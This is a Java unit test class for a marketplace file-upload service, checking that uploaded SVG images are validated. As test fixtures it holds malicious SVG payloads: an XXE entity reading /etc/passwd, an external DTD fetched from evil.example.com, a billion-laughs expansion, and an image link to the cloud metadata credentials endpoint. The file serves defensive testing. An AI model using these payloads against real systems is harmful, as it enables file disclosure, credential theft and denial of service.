package com.personal.marketnote.file.service.file;

import com.personal.marketnote.common.domain.EntityStatus;
import com.personal.marketnote.common.domain.file.FileSort;
import com.personal.marketnote.common.domain.file.OwnerType;
import com.personal.marketnote.file.domain.file.FileDomain;
import com.personal.marketnote.file.domain.file.FileDomainSnapshotState;
import com.personal.marketnote.file.domain.file.exception.InvalidSvgFileException;
import com.personal.marketnote.file.port.in.command.UpdateFileCommand;
import com.personal.marketnote.file.port.in.command.UpdateFilesCommand;
import com.personal.marketnote.file.port.in.usecase.file.GetFileUseCase;
import com.personal.marketnote.file.port.out.event.ImageEventCommand;
import com.personal.marketnote.file.port.out.event.PublishImageEventPort;
import com.personal.marketnote.file.port.out.file.SaveFilesPort;
import com.personal.marketnote.file.port.out.file.UpdateFilesPort;
import com.personal.marketnote.file.port.out.resized.SaveResizedFilesPort;
import com.personal.marketnote.file.port.out.storage.UploadFilesPort;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.mock.web.MockMultipartFile;

import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.anyList;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
class UpdateFilesSvgSecurityTest {

    private static final String VALID_SVG =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    + "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">"
                    + "<rect width=\"100\" height=\"100\" fill=\"red\"/>"
                    + "</svg>";

    private static final String VALID_SVG_NO_XML_DECLARATION =
            "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">"
                    + "<rect width=\"100\" height=\"100\" fill=\"blue\"/>"
                    + "</svg>";

    private static final String MALICIOUS_SVG_EXTERNAL_ENTITY =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    + "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                    + "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">"
                    + "<text>&xxe;</text>"
                    + "</svg>";

    private static final String MALICIOUS_SVG_BILLION_LAUGHS =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    + "<!DOCTYPE svg ["
                    + "<!ENTITY lol \"lol\">"
                    + "<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">"
                    + "]>"
                    + "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>&lol2;</text></svg>";

    private static final String MALICIOUS_SVG_EXTERNAL_URL =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    + "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"100\" height=\"100\">"
                    + "<image xlink:href=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" width=\"100\" height=\"100\"/>"
                    + "</svg>";

    private static final String MALICIOUS_SVG_PARAMETER_ENTITY =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    + "<!DOCTYPE svg [<!ENTITY % remote SYSTEM \"http://evil.example.com/xxe.dtd\"> %remote;]>"
                    + "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";

    private static final String FAKE_SVG_PNG_BYTES = "PNG_BINARY_NOT_SVG_\u0000\u0001\u0002";

    @Mock
    private GetFileUseCase getFileUseCase;
    @Mock
    private UploadFilesPort uploadFilesPort;
    @Mock
    private SaveFilesPort saveFilesPort;
    @Mock
    private SaveResizedFilesPort saveResizedFilesPort;
    @Mock
    private UpdateFilesPort updateFilesPort;
    @Mock
    private PublishImageEventPort publishImageEventPort;

    @InjectMocks
    private UpdateFilesService updateFilesService;

    @Test
    @DisplayName("정상 SVG(XML 선언 포함) 업로드 시 예외 없이 처리된다")
    void updateFiles_validSvgWithXmlDeclaration_processesSuccessfully() {
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "valid.svg",
                "image/svg+xml",
                VALID_SVG.getBytes(StandardCharsets.UTF_8)
        );
        mockSuccessfulPipeline(FileSort.PRODUCT_CATALOG_IMAGE);

        assertThatCode(() -> updateFilesService.updateFiles(command)).doesNotThrowAnyException();

        verify(uploadFilesPort).uploadFiles(anyList(), eq(OwnerType.PRODUCT), eq(1L));
        verify(saveFilesPort).saveAll(anyList(), anyList());
        verify(publishImageEventPort).publishImageCreatedEvents(anyList());
    }

    @Test
    @DisplayName("정상 SVG(XML 선언 없음 + 네임스페이스 포함) 업로드 시 예외 없이 처리된다")
    void updateFiles_validSvgWithoutXmlDeclaration_processesSuccessfully() {
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "valid_no_xml.svg",
                "image/svg+xml",
                VALID_SVG_NO_XML_DECLARATION.getBytes(StandardCharsets.UTF_8)
        );
        mockSuccessfulPipeline(FileSort.PRODUCT_CATALOG_IMAGE);

        assertThatCode(() -> updateFilesService.updateFiles(command)).doesNotThrowAnyException();

        verify(uploadFilesPort).uploadFiles(anyList(), eq(OwnerType.PRODUCT), eq(1L));
    }

    @Test
    @DisplayName("UTF-8 BOM이 포함된 정상 SVG 업로드 시 예외 없이 처리된다")
    void updateFiles_validSvgWithUtf8Bom_processesSuccessfully() {
        byte[] svgBytes = VALID_SVG.getBytes(StandardCharsets.UTF_8);
        byte[] bomSvg = new byte[svgBytes.length + 3];
        bomSvg[0] = (byte) 0xEF;
        bomSvg[1] = (byte) 0xBB;
        bomSvg[2] = (byte) 0xBF;
        System.arraycopy(svgBytes, 0, bomSvg, 3, svgBytes.length);

        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "bom.svg",
                "image/svg+xml",
                bomSvg
        );
        mockSuccessfulPipeline(FileSort.PRODUCT_CATALOG_IMAGE);

        assertThatCode(() -> updateFilesService.updateFiles(command)).doesNotThrowAnyException();

        verify(uploadFilesPort).uploadFiles(anyList(), eq(OwnerType.PRODUCT), eq(1L));
    }

    @Test
    @DisplayName("DOCTYPE + 외부 엔티티(file:///etc/passwd) 포함 SVG 업로드 시 InvalidSvgFileException을 던진다")
    void updateFiles_maliciousSvgExternalEntity_throwsInvalidSvgFileException() {
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "xxe.svg",
                "image/svg+xml",
                MALICIOUS_SVG_EXTERNAL_ENTITY.getBytes(StandardCharsets.UTF_8)
        );
        mockPipelineUntilResize(FileSort.PRODUCT_CATALOG_IMAGE);

        assertThatThrownBy(() -> updateFilesService.updateFiles(command))
                .isInstanceOf(InvalidSvgFileException.class);

        verify(saveResizedFilesPort, never()).saveAll(anyList());
    }

    @Test
    @DisplayName("DOCTYPE + 파라미터 엔티티(외부 DTD) 포함 SVG 업로드 시 InvalidSvgFileException을 던진다")
    void updateFiles_maliciousSvgParameterEntity_throwsInvalidSvgFileException() {
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "param_xxe.svg",
                "image/svg+xml",
                MALICIOUS_SVG_PARAMETER_ENTITY.getBytes(StandardCharsets.UTF_8)
        );
        mockPipelineUntilResize(FileSort.PRODUCT_CATALOG_IMAGE);

        assertThatThrownBy(() -> updateFilesService.updateFiles(command))
                .isInstanceOf(InvalidSvgFileException.class);

        verify(saveResizedFilesPort, never()).saveAll(anyList());
    }

    @Test
    @DisplayName("billion-laughs DTD 포함 SVG 업로드 시 InvalidSvgFileException을 던진다")
    void updateFiles_billionLaughsSvg_throwsInvalidSvgFileException() {
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "billion_laughs.svg",
                "image/svg+xml",
                MALICIOUS_SVG_BILLION_LAUGHS.getBytes(StandardCharsets.UTF_8)
        );
        mockPipelineUntilResize(FileSort.PRODUCT_CATALOG_IMAGE);

        assertThatThrownBy(() -> updateFilesService.updateFiles(command))
                .isInstanceOf(InvalidSvgFileException.class);

        verify(saveResizedFilesPort, never()).saveAll(anyList());
    }

    @Test
    @DisplayName("확장자만 SVG이고 magic bytes가 일치하지 않는 파일 업로드 시 InvalidSvgFileException을 던진다")
    void updateFiles_fakeSvgWithMismatchedMagicBytes_throwsInvalidSvgFileException() {
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "fake.svg",
                "image/svg+xml",
                FAKE_SVG_PNG_BYTES.getBytes(StandardCharsets.UTF_8)
        );
        mockPipelineUntilResize(FileSort.PRODUCT_CATALOG_IMAGE);

        assertThatThrownBy(() -> updateFilesService.updateFiles(command))
                .isInstanceOf(InvalidSvgFileException.class);

        verify(saveResizedFilesPort, never()).saveAll(anyList());
    }

    @Test
    @DisplayName("외부 URL 참조(<image xlink:href=http://...>)가 포함된 SVG는 Batik SSRF 차단으로 리사이즈에 실패한다")
    void updateFiles_svgWithExternalResource_resizeFailsDueToSsrfBlock() {
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "ssrf.svg",
                "image/svg+xml",
                MALICIOUS_SVG_EXTERNAL_URL.getBytes(StandardCharsets.UTF_8)
        );
        FileDomain savedFile = savedFileDomain(500L, FileSort.PRODUCT_CATALOG_IMAGE);
        when(getFileUseCase.getFiles(OwnerType.PRODUCT, 1L, FileSort.PRODUCT_CATALOG_IMAGE.name()))
                .thenReturn(new ArrayList<>());
        when(uploadFilesPort.uploadFiles(anyList(), eq(OwnerType.PRODUCT), eq(1L)))
                .thenReturn(List.of("https://cdn.example.com/ssrf_0.svg"));
        when(saveFilesPort.saveAll(anyList(), anyList()))
                .thenReturn(new ArrayList<>(List.of(savedFile)));

        updateFilesService.updateFiles(command);

        List<ImageEventCommand> published = captureCreatedEvents();
        assertThat(published).hasSize(1);
        assertThat(published.getFirst().resizedImages()).isEmpty();
        verify(saveResizedFilesPort, never()).saveAll(anyList());
    }

    @Test
    @DisplayName("PNG 파일에 SVG 확장자만 붙인 경우(magic bytes 불일치) InvalidSvgFileException을 던진다")
    void updateFiles_pngBytesWithSvgExtension_throwsInvalidSvgFileException() {
        byte[] pngHeader = new byte[]{
                (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                0x00, 0x00, 0x00, 0x0D
        };
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "disguised.svg",
                "image/svg+xml",
                pngHeader
        );
        mockPipelineUntilResize(FileSort.PRODUCT_CATALOG_IMAGE);

        assertThatThrownBy(() -> updateFilesService.updateFiles(command))
                .isInstanceOf(InvalidSvgFileException.class);

        verify(saveResizedFilesPort, never()).saveAll(anyList());
    }

    @Test
    @DisplayName("Content-Type만 svg이고 실제 내용은 SVG가 아닌 경우 InvalidSvgFileException을 던진다")
    void updateFiles_svgContentTypeButNonSvgBody_throwsInvalidSvgFileException() {
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_CATALOG_IMAGE.name(),
                "not_really_svg.png",
                "image/svg+xml",
                "this is plain text, not svg content".getBytes(StandardCharsets.UTF_8)
        );
        mockPipelineUntilResize(FileSort.PRODUCT_CATALOG_IMAGE);

        assertThatThrownBy(() -> updateFilesService.updateFiles(command))
                .isInstanceOf(InvalidSvgFileException.class);

        verify(saveResizedFilesPort, never()).saveAll(anyList());
    }

    @Test
    @DisplayName("대표 이미지 sort로 XXE SVG 업로드 시 InvalidSvgFileException을 던진다")
    void updateFiles_representativeImageXxeSvg_throwsInvalidSvgFileException() {
        UpdateFilesCommand command = buildSvgCommand(
                FileSort.PRODUCT_REPRESENTATIVE_IMAGE.name(),
                "xxe.svg",
                "image/svg+xml",
                MALICIOUS_SVG_EXTERNAL_ENTITY.getBytes(StandardCharsets.UTF_8)
        );
        mockPipelineUntilResize(FileSort.PRODUCT_REPRESENTATIVE_IMAGE);

        assertThatThrownBy(() -> updateFilesService.updateFiles(command))
                .isInstanceOf(InvalidSvgFileException.class);

        verify(saveResizedFilesPort, never()).saveAll(anyList());
    }

    private void mockSuccessfulPipeline(FileSort sort) {
        FileDomain savedFile = savedFileDomain(500L, sort);
        when(getFileUseCase.getFiles(OwnerType.PRODUCT, 1L, sort.name()))
                .thenReturn(new ArrayList<>());
        when(uploadFilesPort.uploadFiles(anyList(), eq(OwnerType.PRODUCT), eq(1L)))
                .thenReturn(List.of("https://cdn.example.com/valid_0.svg"));
        when(saveFilesPort.saveAll(anyList(), anyList()))
                .thenReturn(new ArrayList<>(List.of(savedFile)));
    }

    private void mockPipelineUntilResize(FileSort sort) {
        FileDomain savedFile = savedFileDomain(500L, sort);
        when(getFileUseCase.getFiles(OwnerType.PRODUCT, 1L, sort.name()))
                .thenReturn(new ArrayList<>());
        when(uploadFilesPort.uploadFiles(anyList(), eq(OwnerType.PRODUCT), eq(1L)))
                .thenReturn(List.of("https://cdn.example.com/mal_0.svg"));
        when(saveFilesPort.saveAll(anyList(), anyList()))
                .thenReturn(new ArrayList<>(List.of(savedFile)));
    }

    @SuppressWarnings("unchecked")
    private List<ImageEventCommand> captureCreatedEvents() {
        ArgumentCaptor<List<ImageEventCommand>> captor = ArgumentCaptor.forClass(List.class);
        verify(publishImageEventPort).publishImageCreatedEvents(captor.capture());
        return captor.getValue();
    }

    private UpdateFilesCommand buildSvgCommand(String sort, String filename, String contentType, byte[] content) {
        MockMultipartFile mockFile = new MockMultipartFile("file", filename, contentType, content);
        UpdateFileCommand fileCommand = UpdateFileCommand.builder()
                .file(mockFile)
                .sort(sort)
                .extension("svg")
                .name(filename)
                .build();
        return UpdateFilesCommand.builder()
                .fileInfo(List.of(fileCommand))
                .ownerType("PRODUCT")
                .ownerId(1L)
                .ownerKey("test-owner-key")
                .requesterId(100L)
                .requesterRole("SELLER")
                .build();
    }

    private static FileDomain savedFileDomain(Long id, FileSort sort) {
        return FileDomain.from(FileDomainSnapshotState.builder()
                .id(id)
                .ownerType(OwnerType.PRODUCT)
                .ownerId(1L)
                .sort(sort)
                .extension("svg")
                .name("test_0.svg")
                .storageUrl("https://cdn.example.com/test_0.svg")
                .createdAt(LocalDateTime.of(2026, 1, 1, 0, 0, 0))
                .status(EntityStatus.ACTIVE)
                .orderNum(1L)
                .userId(100L)
                .ownerKey("test-owner-key")
                .build());
    }
}
